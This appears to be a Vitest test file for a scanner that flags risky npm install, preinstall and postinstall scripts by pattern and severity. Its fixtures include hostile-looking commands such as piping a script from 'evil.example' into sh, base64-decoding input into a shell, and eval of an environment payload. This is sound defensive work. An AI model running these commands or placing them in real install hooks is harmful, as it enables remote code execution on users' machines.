import { describe, expect, it } from "vitest";

import type { LifecycleScripts } from "../../../dependency-tree";

import { analyzeInstallScripts } from "../analyze-install-scripts";

const emptyScripts: LifecycleScripts = {
  preinstall: null,
  install: null,
  postinstall: null,
};

describe("analyzeInstallScripts", () => {
  it("should return no warnings when no lifecycle scripts are defined", () => {
    const warnings = analyzeInstallScripts(emptyScripts);

    expect(warnings).toHaveLength(0);
  });

  it("should flag a benign script with a low-severity presence warning", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      postinstall: "node ./setup.js",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "postinstall",
      pattern: "lifecycle script present",
      severity: "low",
      scriptSnippet: "node ./setup.js",
    });
  });

  it("should flag eval() usage as high severity", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      install: "node -e 'eval(process.env.PAYLOAD)'",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "install",
      pattern: "eval()",
      severity: "high",
      scriptSnippet: "node -e 'eval(process.env.PAYLOAD)'",
    });
  });

  it("should flag the Function constructor as high severity", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      install: "node -e 'Function(\"return 1\")()'",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "install",
      pattern: "Function constructor",
      severity: "high",
      scriptSnippet: "node -e 'Function(\"return 1\")()'",
    });
  });

  it("should flag base64 decode as high severity", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      preinstall: "echo $X | base64 -d | sh",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "preinstall",
      pattern: "base64 decode",
      severity: "high",
      scriptSnippet: "echo $X | base64 -d | sh",
    });
  });

  it("should flag curl piped into a shell as high severity", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      postinstall: "curl https://evil.example/install.sh | sh",
    });

    expect(warnings).toHaveLength(2);
    expect(warnings[0]).toMatchObject({
      hook: "postinstall",
      pattern: "remote script piped to shell",
      severity: "high",
      scriptSnippet: "curl https://evil.example/install.sh | sh",
    });
    expect(warnings[1]).toMatchObject({
      hook: "postinstall",
      pattern: "curl",
      severity: "medium",
      scriptSnippet: "curl https://evil.example/install.sh | sh",
    });
  });

  it("should flag bare curl/wget as medium severity", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      postinstall: "curl -o thing.tar.gz https://example.com/thing.tar.gz",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "postinstall",
      pattern: "curl",
      severity: "medium",
      scriptSnippet: "curl -o thing.tar.gz https://example.com/thing.tar.gz",
    });
  });

  it("should flag child_process and rm -rf usage", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      install: 'node -e \'require("child_process").exec("rm -rf /tmp/cache")\'',
    });

    expect(warnings).toHaveLength(2);
    expect(warnings[0]).toMatchObject({
      hook: "install",
      pattern: "child_process",
      severity: "medium",
      scriptSnippet:
        'node -e \'require("child_process").exec("rm -rf /tmp/cache")\'',
    });
    expect(warnings[1]).toMatchObject({
      hook: "install",
      pattern: "rm -rf",
      severity: "medium",
      scriptSnippet:
        'node -e \'require("child_process").exec("rm -rf /tmp/cache")\'',
    });
  });

  it("should not emit a low-severity warning when patterns matched", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      install: "curl -fsSL https://example.com",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "install",
      pattern: "curl",
      severity: "medium",
      scriptSnippet: "curl -fsSL https://example.com",
    });
  });

  it("should not duplicate warnings for the same pattern in one hook", () => {
    const warnings = analyzeInstallScripts({
      ...emptyScripts,
      postinstall: "curl a && curl b",
    });

    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      hook: "postinstall",
      pattern: "curl",
      severity: "medium",
      scriptSnippet: "curl a && curl b",
    });
  });

  it("should flag warnings independently across hooks", () => {
    const warnings = analyzeInstallScripts({
      preinstall: "echo hello",
      install: null,
      postinstall: "curl https://example.com | sh",
    });

    expect(warnings).toHaveLength(3);
    expect(warnings[0]).toMatchObject({
      hook: "preinstall",
      pattern: "lifecycle script present",
      severity: "low",
      scriptSnippet: "echo hello",
    });
    expect(warnings[1]).toMatchObject({
      hook: "postinstall",
      pattern: "remote script piped to shell",
      severity: "high",
      scriptSnippet: "curl https://example.com | sh",
    });
    expect(warnings[2]).toMatchObject({
      hook: "postinstall",
      pattern: "curl",
      severity: "medium",
      scriptSnippet: "curl https://example.com | sh",
    });
  });
});
